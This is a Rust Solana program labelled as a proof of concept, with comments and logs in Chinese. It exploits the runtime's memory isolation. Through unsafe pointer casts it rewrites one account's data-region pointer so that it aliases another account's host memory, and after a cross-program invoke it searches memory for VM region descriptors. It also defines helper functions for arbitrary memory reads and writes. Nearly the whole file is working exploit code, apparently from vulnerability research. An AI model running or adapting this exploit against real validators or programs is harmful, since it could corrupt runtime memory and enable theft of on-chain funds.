use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke_signed,
    pubkey::Pubkey,
    system_instruction,
    system_program,
    program_error::ProgramError,
    program::invoke_unchecked,
    program::invoke,
    instruction::{AccountMeta, Instruction},
};
use solana_program::sysvar::Sysvar;
use solana_program::sysvar::rent::Rent;
use std::{alloc::System, clone, rc::{self, Rc}};         // 如果同时使用 Rc
use borsh::{BorshSerialize, BorshDeserialize};
use std::cell::{RefCell, Ref};
use core::ptr;
// use std::ptr;
#[macro_use] extern crate t_bang;
use t_bang::*;

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub struct MyData {
    pub value:Vec<u8>
}

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("poc开始执行");
    let accounts_iter: &mut std::slice::Iter<'_, AccountInfo<'_>> = &mut accounts.iter();
    // let _pda: &AccountInfo<'_> = next_account_info(accounts_iter)?;       // PDA账户
    let victim: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let receiver: &AccountInfo<'_> = next_account_info(accounts_iter)?;
    let payer: &AccountInfo<'_> = next_account_info(accounts_iter)?; // 支付者
    let callee: &AccountInfo<'_> = next_account_info(accounts_iter)?; // 
    
    let (pda, bump_seed) = Pubkey::find_program_address(
        &[b"seed"],
        program_id,
    );
    

    unsafe {
        let victim_addr = victim as *const AccountInfo as usize as *mut u64;
        let receiver_addr = receiver as *const AccountInfo as usize as *mut u64;
        let payer_addr = payer as *const AccountInfo as usize as *mut u64;
        // let victim_addr = victim as *const AccountInfo as usize as *mut u64;
        // dumpMem(receiver_addr,0x6);
        // dumpMem(payer_addr,0x6);
        // dumpMem(victim_addr,0x6);
        let v_data_addr = *victim_addr.offset(2) as *mut u64; 
        let r_data_addr = *receiver_addr.offset(2) as *mut u64; 
        let p_data_addr = *payer_addr.offset(2) as *mut u64;  
        // let v_data_addr = *victim_addr.offset(2) as *mut u64; 
        dumpMem(v_data_addr,0x6);  
        dumpMem(r_data_addr,0x6);
        dumpMem(p_data_addr,0x6);
        // dumpMem(v_data_addr,0xa);
        *(p_data_addr.offset(3)) = *(r_data_addr.offset(3))-0x100000; // victim receiver payer 也就是说p_data_addr 的 vm 指向 r_data_addr 的host
        dumpMem(v_data_addr,0x6);
        dumpMem(r_data_addr,0x6);
        dumpMem(p_data_addr,0x6);
        // dumpMem(r_data_addr,0xa);
        // dumpMem(p_data_addr,0xa);
        // dumpMem(v_data_addr,0xa);
        // msg!("Caller unsafe: Attempted to modify payer_addr.offset(2)");
    }


    let accounts_for_b = vec![payer.clone()];
    let instruction = Instruction::new_with_borsh(
        *callee.key, // 要调用的程序的公钥
        &_instruction_data, // 传递给 program B 的数据
        vec![ AccountMeta::new(*payer.key, true)]
    );
    invoke_signed(
        &instruction,
        &accounts_for_b,
        &[&[b"seed", &[bump_seed]]],
    )?;
    
    unsafe {
        let rc_payer_ptr = Rc::as_ptr(&payer.data) as *mut RefCell<&mut [u8]>;
        let p_ptr    = rc_payer_ptr as *mut u64 ;
        let p_data_ptr = *(p_ptr.wrapping_add(1)) as *mut u64;

        let v_ptr = Rc::as_ptr(&victim.data) as *mut RefCell<&mut [u8]>;
        let v    = v_ptr as *mut u64 ;
        let v_data_ptr = *(v.wrapping_add(1)) as *mut u64;

        let receiver_region_vm_start = searchMem(v_data_ptr,0x0000000400000060,0x0000000400100060,0x100000,0x90000);
        // dumpMem(v_data_ptr,0x100);
        if receiver_region_vm_start != ptr::null_mut(){
            let receiver_region_addr = receiver_region_vm_start.offset(-1);
            msg!("memory region of 0x0000000400000060 at {:#x}", receiver_region_addr as u64);
            dumpMem(p_data_ptr,0x100);
        }else{
            {
                    let libc_base: u64 = 0x3e3e3e3e3e3e3e3e;
                    let bytes = libc_base.to_be_bytes(); 
                    let mut data = receiver.data.borrow_mut();
                    data[..bytes.len()].copy_from_slice(&bytes);
            }
        }
    }

    msg!("poc执行结束");
    Ok(())
}

fn abread(victim_region_addr: *mut u64, v_data_ptr:*mut u64, victim_addr: u64)-> u64{
    unsafe{
        let original_victim_host_addr = *victim_region_addr;
        *(victim_region_addr.offset(0)) = victim_addr;
        let value = *(v_data_ptr.offset(0));
        *(victim_region_addr.offset(0)) = original_victim_host_addr;
        return value;
    }
}


fn abwrite(victim_region_addr: *mut u64, v_data_ptr:*mut u64, victim_addr: u64, value: u64){
    unsafe{
        let original_victim_host_addr = *victim_region_addr;
        *(victim_region_addr.offset(0)) = victim_addr;
        *(v_data_ptr.offset(0)) = value;
        *(victim_region_addr.offset(0)) = original_victim_host_addr;
    }
}


fn searchMem(addr: *mut u64, vm_addr: u64, vm_end: u64, vm_len:u64, len: isize) -> *mut u64 {
    if len < 16 {
        msg!("搜索长度过短，无法容纳 vm_addr 和 vm_end。");
        return ptr::null_mut();
    }
    let num_u64s = len / 8;
    msg!("在内存地址 {:#?} 开始，搜索 {} 个 u64 值...", addr, num_u64s);
    unsafe {
        for i in 0..(num_u64s.saturating_sub(1)) { // 使用 saturating_sub 避免 len/8 < 1 时的恐慌
            let current_ptr = addr.offset(i);
            let next_ptr    = current_ptr.offset(1);
            let n_next_ptr  = current_ptr.offset(2);
            if (current_ptr as *const u8) > (addr as *const u8).add(len as usize - 8) || 
               (next_ptr as *const u8) > (addr as *const u8).add(len as usize - 8) { 
                 msg!("警告: 指针 {:#?} 或 {:#?} 超出安全搜索范围，停止搜索。", current_ptr, next_ptr);
                 break;
            }
            let val1 = *current_ptr;
            let val2 = *next_ptr;
            let val3 = *n_next_ptr;

            if val1 == vm_addr && val2 == vm_end && val3 == vm_len {
                msg!(
                    "在基地址 {:#?} 偏移量 {:#x} 处找到目标序列: {:#x} 和 {:#x}",
                    addr,
                    i * 8,
                    vm_addr,
                    vm_end
                );
                return current_ptr;
            }
        }
    } 
    msg!("指定内存区域搜索完成。未找到目标序列。");
    return ptr::null_mut();
}



fn dumpMem(addr: *mut u64, len: isize) {
    msg!("\n");
    for i in 0..len {
        unsafe { 
            if i%2 == 0{
                msg!("{:?}: {:>016x} {:>016x}", addr.offset(i), *(addr.offset(i)), *(addr.offset(i+1)));
            }
        };
    }
    msg!("\n")
}